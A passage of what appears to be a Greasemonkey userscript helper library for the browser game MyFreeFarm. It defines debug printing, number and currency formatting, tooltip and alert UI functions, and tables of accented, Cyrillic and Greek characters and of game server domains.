	if (!showType){ showType=false; }
	if (!linebreak){ linebreak="<br/>"; }
	try{
	if(typeof arr == "object"){
		for (var i in arr ){
			try{
				if(!arr.hasOwnProperty(i)){ continue; }
				var type = (arr instanceof Array);
				////GM_log("i:" + i + " : " + typeof arr[i] + " | " + arr + "\n");
				if (typeof arr[i] == "string" || typeof arr[i] == "number" || typeof arr[i] == "boolean") {
					str += line + (type?"[":"{") + i + (type?"]":"}") + " = " + arr[i] + ((showType)?" ("+typeof(arr[i])+")":"") + linebreak;
				} else if(typeof arr[i] == "undefined"){
					str += line + (type?"[":"{") + i + (type?"]":"}") + " = " + linebreak;
				} else if(typeof arr[i] != "function"){
					str += print_r(arr[i],line +(type?"[":"{") + i + (type?"]":"}"),showType,linebreak);
				}
			}catch(err){
				GM_log("ERROR: print_r i:"+i+"\n"+err);
				continue;
			}
		}
		if(!i){str += line + " = " + "undefined" + linebreak;}
	}else{
		str += " = " + arr;
	}
	return str;
	} catch (err){
		GM_log("Print_r error : " + err);
		throw ("Print_r error : " + err);
	}
}
function print_r_time(arr,line){
	var str = new String();
//		for (var i = 0; i < arr.length; i++){
	try{
		for (var i in arr){
			try{
				if(!arr.hasOwnProperty(i)){ continue; }
				////GM_log("i:" + i + " : " + typeof arr[i] + " | " + arr + "\n");
				if (typeof arr[i] == "string" || typeof arr[i] == "number" || typeof arr[i] == "boolean") {
					str += line + "[" + i + "] = " + getDaytimeStr(arr[i]) + "<br/>";
				} else if(typeof arr[i] == "undefined"){
					str += line + "[" + i + "] = " + "<br/>";
				} else {
					str += print_r_time(arr[i],line +"[" + i + "]");
				}
			}catch(err){
				GM_log("ERROR: print_r_time i:"+i+"\n"+err);
				continue;
			}
		}
		if(!i){str += line + " = " + "undefined" + "<br/>";}
		return str;
	} catch (err){
		GM_log("Print_r_time error : " + err);
		throw ("Print_r_time error : " + err);
	}
}
function Log(obj,pre){
	if(true){
		if(pre==undefined){ pre=""; }
		if(typeof(obj)=="object"){
			//GM_log("______________________________ object");
			for(var v in obj){ 
				if(!obj.hasOwnProperty(v)){ continue; }
				Log(obj[v],pre+v+" : "); 
			}
			//GM_log("______________________________ object end");
		} else {
			if(typeof(obj)!="function") GM_log(pre+obj);
		}
	}
}

//---------------------------------------------------------------------------------------------------------------------------

function numberFormat(number,decimals,dec_point,thousands_sep){
	// http://kevin.vanzonneveld.net
	// +   original by: Jonas Raoni Soares Silva (http://www.jsfromhell.com)
	// +   improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net)
	// +     bugfix by: Michael White (http://getsprink.com)
	// +     bugfix by: Benjamin Lupton
	// +     bugfix by: Allan Jensen (http://www.winternet.no)
	// +    revised by: Jonas Raoni Soares Silva (http://www.jsfromhell.com)
	// +     bugfix by: Howard Yeend
	// +    revised by: Luke Smith (http://lucassmith.name)
	// +     bugfix by: Diogo Resende
	// +     bugfix by: Rival
	// %        note 1: For 1000.55 result with precision 1 in FF/Opera is 1,000.5, but in IE is 1,000.6
	// *     example 1: numberFormat(1234.56);
	// *     returns 1: '1,235'
	// *     example 2: numberFormat(1234.56, 2, ',', ' ');
	// *     returns 2: '1 234,56'
	// *     example 3: numberFormat(1234.5678, 2, '.', '');
	// *     returns 3: '1234.57'
	// *     example 4: numberFormat(67, 2, ',', '.');
	// *     returns 4: '67,00'
	// *     example 5: numberFormat(1000);
	// *     returns 5: '1,000'
	// *     example 6: numberFormat(67.311, 2);
	// *     returns 6: '67.31'

	var n = number, prec = decimals;
	n = !isFinite(+n) ? 0 : +n;
	prec = !isFinite(+prec) ? 0 : Math.abs(prec);
	var sep = (typeof thousands_sep == "undefined") ? delimThou : thousands_sep; // changed!
	var dec = (typeof dec_point == "undefined") ? delimDeci : dec_point; // changed!

	var s = (prec > 0) ? n.toFixed(prec) : Math.round(n).toFixed(prec); //fix for IE parseFloat(0.55).toFixed(0) = 0;

	var abs = Math.abs(n).toFixed(prec);
	var _, i;

	if (abs >= 1000) {
		_ = abs.split(/\D/);
		i = _[0].length % 3 || 3;

		_[0] = s.slice(0,i + (n < 0)) +
			 _[0].slice(i).replace(/(\d{3})/g, sep+'$1');

		s = _.join(dec);
	} else {
		s = s.replace('.', dec);
	}
	return s;
}

function produktPic(type,product,append){
// type: 0 = farm, 1 = forest, 2 = windmill
	var prodNum = isNaN(parseInt(product,10))?prodId[product]:parseInt(product,10);
	var type = parseInt(type,10);
	var newdiv = createElement("div",{"type":type,"prod":prodNum,"style":"display:inline-block;position:relative;margin-right:3px;border:none;vertical-align:bottom;"});
	switch(type){
	case 0:
		if (prodNum>0){
			newdiv.setAttribute("class","kp"+prodNum);
		} else {
			createElement("img",{"src":GFX+"menu/coins.gif","style":"height:15px;width:15px;border:none;top:0px;vertical-align:bottom;"},newdiv);
		}
	break;
	case 1:	newdiv.setAttribute("class","f_m_symbol"+prodNum); break;
	case 2:	newdiv.setAttribute("class","fmm"+prodNum); break;
	case 3:	newdiv.setAttribute("class","fmm"+prodNum); break;
	default: GM_log("unknown arguments in function-call of produktPic :type="+type+",product="+product);
	}
	if (append){ append.appendChild(newdiv); }
	return newdiv;
}

function moneyFormat(number){return numberFormat(number,2)+"&nbsp;"+texte["waehrung"];}
function moneyFormatInt(number){return numberFormat(number,0)+"&nbsp;"+texte["waehrung"];}
function moneyFormatLimit(number,limit){return (number>limit?moneyFormatInt(number):moneyFormat(number));}
function pointsFormat(number,containertype,append){
	var newspan = createElement(containertype,{"style":"white-space:nowrap;"},append?append:false);
	newspan.addEventListener("mouseover",function(event){ showToolTip(event,texte["punkte"]); },false);
	createElement("img",{"src":GFX+"points.gif","style":"border:0px;width:12px;height:12px;margin-right:2px;"},newspan);
	createElement("span",{},newspan,numberFormat(number));
	return newspan;
}
function coinsFormat(number,append){
	var newdiv = createElement("div",{"style":"display:inline-block;height:16px;"});
	newdiv.addEventListener("mouseover",function(event){ showToolTip(event,prodName[0]); },false);
	var newdiv1 = produktPic(0,0,newdiv);
	createElement("span",{},newdiv,numberFormat(number));
	if (append) append.appendChild(newdiv);
	return newdiv;
}
function getForestryUserBuilding(pos){
	if(unsafeWindow.forestry_user_buildings!=undefined&&pos!=undefined){
		for(var building in unsafeWindow.forestry_user_buildings){
			if(!unsafeWindow.forestry_user_buildings.hasOwnProperty(building)){continue;}
			if(unsafeWindow.forestry_user_buildings[building]["position"]==pos){
				return pos;
			}
		}
	}
	return false;
}
//---------------------------------------------------------------------------------------------------------------------------

function getRandom( min, max ){
	if ( min > max ){return( -1 );	}
	if ( min == max ){return( min );}
	return( min + parseInt( Math.random() * ( max-min+1 ),10 ) );
}
function compareVersions(ver1,ver2){
	// returns -1 if ver1<ver2
	// returns 0 if ver1=ver2
	// returns +1 if ver1>ver2
	if(ver1==ver2){
		return 0;
	} else {
		ver1 = /(\d+)\.*(.*)/.exec(ver1);
		ver2 = /(\d+)\.*(.*)/.exec(ver2);
		if(parseInt(ver1[1],10)<parseInt(ver2[1],10)){
			return -1;
		} else if(ver1[1]==ver2[1]){
			if(ver1[2]==""){ return -1; }
			if(ver2[2]==""){ return 1; }
			return compareVersions(ver1[2],ver2[2]);
		} else {
			return 1;
		}
	}
}

function alert2(text,yes,no,yesFkt,noFkt){
	var newdiv = createElement("div",{"style":"display:block;z-index:9999;position:fixed;top:0px;left:0px;width:100%;height:100%;"},top.document.body);
	createElement("div",{"style":"display:block;position:fixed;top:0px;left:0px;width:100%;height:100%;background-color:black;opacity:0.7;"},newdiv);
	newdiv = createElement("div",{"style":"display:block;position:fixed;width:300px;top:50%;left:50%;margin-left:-180px;padding:30px;background-color:yellow;border:3px solid black;border-radius:10px;color:black;font-weight:bold;"},newdiv);
	createElement("div",{"style":"position:relative;color:black;font-weight:bold;"},newdiv,text);
	var newdiv1 = createElement("div",{"style":"position:relative;height:37px;witdh:100%;color:black;font-weight:bold;"},newdiv);
	var newbutton = createElement("button",{"type":"button","class":"link","style":"position:absolute;top:20px;left:30px;width:100px;font-weight:bold;"},newdiv1,yes);
	newbutton.addEventListener("click",function(){
		if(typeof yesFkt=="function"){ yesFkt(); }
		removeElement(this.parentNode.parentNode.parentNode);
	},false);
	if(no){
		newbutton = createElement("button",{"type":"button","class":"link","style":"position:absolute;top:20px;right:30px;width:100px;font-weight:bold;"},newdiv1,no);
		newbutton.addEventListener("click",function(){
			if(typeof noFkt=="function"){ noFkt(); }
			removeElement(this.parentNode.parentNode.parentNode);
		},false);
	}
	newdiv.style.marginTop = -(newdiv.offsetHeight/2)+"px";
	newdiv=null;newdiv1=null;newbutton=null;
}

function showToolTip(evt,content){
	var help = getOffset(frameElement);
	TOOLTIP.setAttribute("targetId",evt.target.id);
	TOOLTIP.innerHTML = content;
	TOOLTIP.style.display = "block";
	window.addEventListener("mouseout",hideToolTip,false);
	var cleft = (evt.pageX+help.left-(TOOLTIP.offsetWidth/3));
	var mleft = Math.min(0,(top.document.body.clientWidth - cleft - TOOLTIP.offsetWidth));
	TOOLTIP.style.left = cleft + mleft + "px";
	TOOLTIP.style.top = (((top.document.body.clientHeight - evt.pageY+help.top - 25 - TOOLTIP.offsetHeight)<0)?(evt.pageY+help.top-25-TOOLTIP.offsetHeight):(evt.pageY+help.top+25)) + "px";
}
function adjustToolTip(targetElem){
	if (targetElem!=undefined && TOOLTIP.getAttribute("targetId")==targetElem.id){
		var xLeft = TOOLTIP.offsetLeft;
		var xTop = TOOLTIP.offsetTop;
		var B = document.createEvent("MouseEvents");
		B.initEvent("mouseout", true, true);
		targetElem.dispatchEvent(B);
		B.initEvent("mouseover", true, true);
		//B.initMouseEvent("mouseover", true, true, window,0, 0, 0, 0, 0, false, false, false, false, 0, null); //TODO set the correct coords
		targetElem.dispatchEvent(B);
		TOOLTIP.style.left = xLeft+"px";
		TOOLTIP.style.top = xTop+"px";
	}
}
function hideToolTip(){
	window.removeEventListener("mouseout",hideToolTip,false);
	TOOLTIP.setAttribute("targetId","");
	TOOLTIP.style.display = "none";
	TOOLTIP.innerHTML = "";
}

function showInLogBubble(text,timer,color){
	if(DEVMODE){GM_log("showInLogBubble: "+text); }
	if (timer==undefined) timer=10;
	if (color==undefined) color="blue";
	var newdiv = createElement("div",{"class":"blackbox","viewendtime":(now+timer),"style":"background-color:"+color+";border:2px solid black;border-radius:10px;padding:5px;margin-top:5px;"},LOG_BUBBLE_BOX,getDaytimeStr(now)+"&nbsp;"+text);
}
var clearLogBubbleActive = false;
function clearLogBubble(){
	clearLogBubbleActive = true;
	if(LOG_BUBBLE_BOX.getAttribute("isMouseOver")=="0"){
		var c,d=NEVER;
		for (var i=LOG_BUBBLE_BOX.childElementCount-1;i>=0;i--){
			c = parseInt(LOG_BUBBLE_BOX.children[i].getAttribute("viewendtime"),10);
			if (c <= now){
				removeElement(LOG_BUBBLE_BOX.children[i]);
			} else {
				d = Math.min(d,c);
			}
		}
		if(d<NEVER){ window.setTimeout(clearLogBubble,Math.max(0,1000*(d-now)+100)); }
		else { clearLogBubbleActive = false; }
	} else {
		window.setTimeout(clearLogBubble,1000);
	}
}

function cyr_helper(str){
	var helper = new Object();
	helper["cyr_a"] =        cyr_a ;
	helper["cyr_be"] =       cyr_be;
	helper["cyr_che"] =      cyr_che;
	helper["cyr_De"] =       cyr_De;
	helper["cyr_de"] =       cyr_de;
	helper["cyr_el"] =       cyr_el;
	helper["cyr_em"] =       cyr_em;
	helper["cyr_en"] =       cyr_en;
	helper["cyr_Er"] =       cyr_Er;
	helper["cyr_er"] =       cyr_er;
	helper["cyr_Es"] =       cyr_Es;
	helper["cyr_es"] =       cyr_es;
	helper["cyr_ghe"] =      cyr_ghe;
	helper["cyr_hardsign"] = cyr_hardsign;
	helper["cyr_ka"] =       cyr_ka;
	helper["cyr_i"] =        cyr_i;
	helper["cyr_ie"] =       cyr_ie;
	helper["cyr_io"] =       cyr_io;
	helper["cyr_i_short"] =  cyr_i_short;
	helper["cyr_o"] =        cyr_o;
	helper["cyr_Pe"] =       cyr_Pe;
	helper["cyr_pe"] =       cyr_pe;
	helper["cyr_sha"] =      cyr_sha;
	helper["cyr_shcha"] =    cyr_shcha;
	helper["cyr_softsign"] = cyr_softsign;
	helper["cyr_Te"] =       cyr_Te;
	helper["cyr_te"] =       cyr_te;
	helper["cyr_U"] =        cyr_U;
	helper["cyr_u"] =        cyr_u;
	helper["cyr_ve"] =       cyr_ve;
	helper["cyr_ya"] =       cyr_ya;
	helper["cyr_yeru"] =     cyr_yeru;
	helper["cyr_yu"] =       cyr_yu;
	helper["cyr_ze"] =       cyr_ze;
	str = str.split("");
	for(var v=0;v<str.length;v++){
		for(var w in helper){
			if(!helper.hasOwnProperty(w)){ continue; }
			if(str[v]==helper[w]){
				str[v] = w;
			}
		}
	}
	GM_log(str);
	GM_log(str.join("+"));
}
function greek_helper(str){
	var helper = new Object();
helper["greek_alpha"] = greek_alpha;
helper["greek_beta"] = greek_beta;
helper["greek_epsilon_tonos"] = greek_epsilon_tonos;
helper["greek_epsilon"] = greek_epsilon; 
helper["greek_eta"] = greek_eta;
helper["greek_eta_tonos"] = greek_eta_tonos;
helper["greek_gamma"] = greek_gamma;
helper["greek_iota"] = greek_iota;
helper["greek_iota_dialytika"] = greek_iota_dialytika ;
helper["greek_iota_tonos"] = greek_iota_tonos ;
helper["greek_kappa"] = greek_kappa;
helper["greek_Kappa"] = greek_Kappa;
helper["greek_lambda"] = greek_lambda;
helper["greek_mu"] = greek_mu;
helper["greek_nu"] = greek_nu;
helper["greek_omega"] = greek_omega;
helper["greek_omega_tonos"] = greek_omega_tonos;
helper["greek_omicron"] = greek_omicron;
helper["greek_omicron_tonos"] = greek_omicron_tonos;
helper["greek_phi"] = greek_phi;
helper["greek_pi"] = greek_pi;
helper["greek_Pi"] = greek_Pi;
helper["greek_psi"] = greek_psi;
helper["greek_rho"] = greek_rho;
helper["greek_sigma"] = greek_sigma;
helper["greek_tau"] = greek_tau;
helper["greek_Tau"] = greek_Tau;
helper["greek_theta"] = greek_theta;
helper["greek_upsilon"] = greek_upsilon;
helper["greek_upsilon_tonos"] = greek_upsilon_tonos;
	str = str.split("");
	for(var v=0;v<str.length;v++){
		for(var w in helper){
			if(!helper.hasOwnProperty(w)){ continue; }
			if(str[v]==helper[w]){
				str[v] = w;
			}
		}
	}
	GM_log(str);
	GM_log(str.join("+"));
}

// CONSTANTS / GLOBALS ************************************************************************************************
// DOM
var ALL = null;
var TOOLTIP = null;
var LOG_BUBBLE_BOX = null;
	
// Objects
try{
	if(!unsafeWindow.greaseMonkeyData){ unsafeWindow.greaseMonkeyData=new Object(); }
	var unsafeData = unsafeWindow.greaseMonkeyData;
}catch(err){ GM_log("ERROR unsafeData ("+location.href+")\n"+err); }
try{
	if(!top.window.wrappedJSObject.greaseMonkeyData){ top.window.wrappedJSObject.greaseMonkeyData=new Object(); }
	top.unsafeData = top.window.wrappedJSObject.greaseMonkeyData;
}catch(err){ GM_log("ERROR top.unsafeData ("+location.href+")\n"+err); }
const STAT_SERVER = {"au":"mff.i24.cc","br":"mff.i24.cc","bu":"mff.i24.cc","de":"mff.i24.cc","dk":"mff.i24.cc","es":"mff.i24.cc","fr":"mff.i24.cc","gr":"mff.i24.cc","hu":"mff.i24.cc","it":"mff.i24.cc","nl":"mff.i24.cc","no":"mff.i24.cc","nz":"mff.i24.cc","pl":"mff.i24.cc","pt":"mff.i24.cc","ro":"mff.i24.cc","ru":"mff.i24.cc","se":"mff.i24.cc","tr":"mff.i24.cc","uk":"mff.i24.cc","us":"mff.i24.cc"};
const STAT_VIEW = {"de":"mff.i24.cc"}; // {"au":"mff.i24.cc","br":"mff.i24.cc","bu":"mff.i24.cc","de":"mff.i24.cc","dk":"mff.i24.cc","es":"mff.i24.cc","fr":"mff.i24.cc","gr":"mff.i24.cc","hu":"mff.i24.cc","it":"mff.i24.cc","nl":"mff.i24.cc","nz":"mff.i24.cc","pl":"mff.i24.cc","pt":"mff.i24.cc","ro":"mff.i24.cc","ru":"mff.i24.cc","se":"mff.i24.cc","tr":"mff.i24.cc","uk":"mff.i24.cc","us":"mff.i24.cc"};
const GAMEPAGES = {"au":"au.myfreefarm.com","br":"myfreefarm.com.br","bu":"veselaferma.com","de":"myfreefarm.de","dk":"myfreefarm.dk","es":"migranjalinda.es","fr":"mabelleferme.fr","gr":"myfreefarm.gr","hu":"enkicsitanyam.hu","ir":"myfreefarm.ir","it":"myfreefarm.it","nl":"myfreefarm.nl","no":"myfreefarm.no","nz":"myfreefarm.co.nz","pl":"wolnifarmerzy.pl","pt":"pt.myfreefarm.com","ro":"fermavesela.ro","ru":"mojaderewnja.ru","se":"myfreefarm.se","tr":"tr.myfreefarm.com","uk":"myfreefarm.co.uk","us":"myfreefarm.com"};
var pageZusatz = new Object();
if(location.search!=""){
	var help = location.search.replace(/^\?/,"").split(/\&/);
	for(var v=0;v<help.length;v++){
		var help2 = help[v].split(/\=/);
		pageZusatz[help2[0]] = help2[1];
	}
}
const sortObjFunctions = {
	"desc":function(a,b){return ((b[0]>a[0])-(b[0]<a[0]));},
	"int":function(a,b){return (parseInt(a[0],10)-parseInt(b[0],10));},
	"float":function(a,b){return (parseFloat(a[0],10)-parseFloat(b[0],10));},
	"date":function(a,b){return (getTime(a[0])-getTime(b[0]));},
	"productId":function(a,b){
		if(prodTyp[0][a[0]]==prodTyp[0][b[0]]){
			return(parseInt(a[0],10)-parseInt(b[0],10));
		} else {
			return({"c":0,"v":1,"e":2,"o":3,"fw1":4,"fw2":5,"fw3":6,"fw4":7,"z":8}[prodTyp[0][a[0]]]-{"c":0,"v":1,"e":2,"o":3,"fw1":4,"fw2":5,"fw3":6,"fw4":7,"z":8}[prodTyp[0][b[0]]]);
		}
	}
};

// Strings
var texte = null;
var LNG = null;
var delimThou = null;
var regDelimThou = null;
var delimDeci = null;
var regDelimDeci = null;
var dateFormatDM = "day.month.";
var dateFormatDMY = "day.month.year";
var timeFormatHM = "hour:min";
var timeFormatHMS = "hour:min:sec";

var SERVER = null;
var PAGE = null;
var GFX = null; // http://mff.wavecdn.de/mff/
var USERNAME = null;

// Numbers
var now = Math.floor((new Date()).getTime()/1000);
var todayStr;
var nowServerOff;
var todayServerStr;
// call:
// now = Math.floor((new Date()).getTime()/1000);
// todayStr = getDateStr(now,2,false); //4.2.2011
// nowServerOff = unsafeWindow.Zeit.Server+OFFSET;
// todayServerStr = getDateStr(nowServerOff,2,false);
var valServerTimeOffset = 0;
const NEVER = 2147483000; //upper limit of signed long

// special characters
const sign_average = "\u2205";
const sign_mult = "\u00D7";
const sign_sum = "\u2211"; //"\u03A3"
const sign_inf = "\u221E";
const invert_exclamation = "\u00A1"; 
const sign_promill = "\u2030";
const sign_basepoint = "\u2031";
const A_ac = "\u00C1";
const A_dots = "\u00C4";
const a_ac = "\u00E1";
const a_dots = "\u00E4";
const a_circumflex = "\u00E2";
const a_grave = "\u00E0";
const a_ogonek = "\u0105";
const a_ring = "\u00E5";
const a_tilde = "\u00E3";
const c_ac = "\u0107";
const C_cedilla = "\u00C7";
const c_cedilla = "\u00E7";
const E_ac = "\u00C9";
const e_ac = "\u00E9";
const e_grave = "\u00E8";
const e_ogonek = "\u0119";
const e_circumflex = "\u00EA";
const G_breve = "\u011E";
const g_breve = "\u011F";
const I_ac = "\u00CD";
const I_dot = "\u0130";
const i_ac = "\u00ED";
const i_dotless = "\u0131";
const i_circumflex = "\u00EE";
const L_stroke ="\u0141";
const l_stroke = "\u0142";
const n_ac = "\u0144";
const O_ac = "\u00D3";
const O_dots = "\u00D6";
const o_ac = "\u00F3";
const o_ac_double = "\u0151";
const o_circ = "\u00F4";
const o_dots = "\u00F6";
const o_stroke = "\u00F8";
const o_tilde = "\u00F5";
const sz = "\u00DF";
const S_ac = "\u015A";
const S_cedilla = "\u015E";
const s_ac = "\u015B";
const s_cedilla = "\u015F";
const U_ac = "\u00DA";
const U_ac_double = "\u0170";
const U_dots = "\u00DC";
const u_ac = "\u00FA";
const u_ac_double = "\u0171";
const u_dots = "\u00FC";
const z_ac = "\u017A";
const z_dot = "\u017C";
		
const cyr_a = "\u0430";
const cyr_be = "\u0431";
const cyr_che = "\u0447";
const cyr_De = "\u0414";
const cyr_de = "\u0434";
const cyr_el = "\u043B";
const cyr_em = "\u043C";
const cyr_en = "\u043D";
const cyr_Er = "\u0420";
const cyr_er = "\u0440";
const cyr_Es = "\u0421";
const cyr_es = "\u0441";
const cyr_ghe = "\u0433";
const cyr_hardsign = "\u044A";
const cyr_Ka = "\u041A";
const cyr_ka = "\u043A";
const cyr_i = "\u0438";
const cyr_ie = "\u0435";
const cyr_io = "\u0451";
const cyr_i_short = "\u0439";
const cyr_o = "\u043E";
const cyr_Pe = "\u041F";
const cyr_pe = "\u043F";
const cyr_sha = "\u0448";
const cyr_shcha = "\u0449";
const cyr_softsign = "\u044C";
const cyr_Te = "\u0422";
const cyr_te = "\u0442";
const cyr_U = "\u0423";
const cyr_u = "\u0443";
const cyr_ve = "\u0432";
const cyr_ya = "\u044F";
const cyr_yeru = "\u044B";
const cyr_yu = "\u044E";
const cyr_ze = "\u0437";
//cyr_helper("cyrillic string");

const greek_alpha = "\u03B1";
const greek_alpha_tonos = "\u03AC";
const greek_Alpha = "\u0391";
const greek_beta = "\u03B2";
const greek_epsilon_tonos = "\u03AD";
const greek_epsilon = "\u03B5"; 
const greek_eta = "\u03B7";
const greek_eta_tonos = "\u03AE";
const greek_gamma = "\u03B3";
const greek_iota = "\u03B9";
const greek_iota_dialytika = "\u03CA";
const greek_iota_tonos = "\u03AF";
const greek_kappa = "\u03BA";
const greek_Kappa = "\u039A";
const greek_lambda = "\u03BB";
const greek_mu = "\u03BC";
const greek_nu = "\u03BD";
const greek_omega = "\u03C9";
const greek_omega_tonos = "\u03CE";
const greek_omicron = "\u03BF";
const greek_omicron_tonos = "\u03CC";
const greek_phi = "\u03C6";
const greek_pi = "\u03C0";
const greek_Pi = "\u03A0";
const greek_psi = "\u03C8";
const greek_rho = "\u03C1";
const greek_sigma = "\u03C3";
const greek_tau = "\u03C4";
const greek_Tau = "\u03A4";
const greek_theta = "\u03B8";
const greek_upsilon = "\u03C5";
const greek_upsilon_tonos = "\u03CD";
//greek_helper("");

// ON LOAD ***************************************************************************************************************

window.addEventListener("load",function(){
	ALL = document.getElementsByTagName("body")[0];
	GFX = top.window.wrappedJSObject._GFX?top.window.wrappedJSObject._GFX:"http://mff.wavecdn.de/mff/";

	/*
	addons have to execute:
	TOOLTIP = $top("divToolTip");
	LOG_BUBBLE_BOX = $top("divLogBubbleBox");
	*/
},false);
